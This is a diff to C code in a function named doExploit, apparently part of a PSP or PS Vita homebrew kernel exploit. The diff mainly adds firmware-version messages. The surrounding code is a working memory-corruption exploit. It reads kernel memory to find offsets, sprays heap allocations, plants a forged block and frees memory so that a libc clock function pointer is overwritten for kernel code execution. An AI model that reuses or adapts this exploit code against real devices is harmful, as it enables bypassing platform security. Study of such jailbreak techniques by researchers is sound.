@@ -176,18 +176,20 @@ int doExploit(void) {
     u32 seed = 0;
     u32 type_uid = TYPE_UID_OFFSET_360;
 
-    //if (_sceNpCore_8AFAB4A0 != NULL){
     if (_sceNetMCopyback_1560F143 != NULL){
       u32 test_val = readKram(SYSMEM_SEED_OFFSET_CHECK);
-	  PRTSTR1("test_val: 0x%p", test_val);
       if (test_val == 0x8F154E38){
         seed = readKram(SYSMEM_SEED_OFFSET_365);
         libc_clock_offset = LIBC_CLOCK_OFFSET_365;
-	  	PRTSTR1("test_val: 0x%p", test_val);
+        PRTSTR("Vita 3.65");
       }
       else if (test_val == 0x8FBF003C){
         libc_clock_offset = LIBC_CLOCK_OFFSET_660;
         type_uid = TYPE_UID_OFFSET_660;
+        PRTSTR("PSP 6.60");
+      }
+      else {
+        PRTSTR("Vita 3.60");
       }
     }
 
@@ -197,7 +199,6 @@ int doExploit(void) {
     SceUID dummyid;
     for (int i=0; i<10; i++)
       dummyid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, dummy, PSP_SMEM_High, 0x10, NULL);
-      //g_tbl->KernelDcacheWritebackAll();
 
     // we can calculate the address of dummy block via its UID and from there calculate where the next block will be
     u32 dummyaddr = 0x88000000 + ((dummyid >> 5) & ~3);
@@ -209,7 +210,7 @@ int doExploit(void) {
     u32 string[] = { libc_clock_offset - 4, 0x88888888, type_uid, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
     SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)string, PSP_SMEM_High, 0x10, NULL);
 
-    g_tbl->KernelDcacheWritebackAll();
+    //g_tbl->KernelDcacheWritebackAll();
 
     // Overwrite function pointer at LIBC_CLOCK_OFFSET with 0x88888888
     res = g_tbl->KernelFreePartitionMemory(uid);
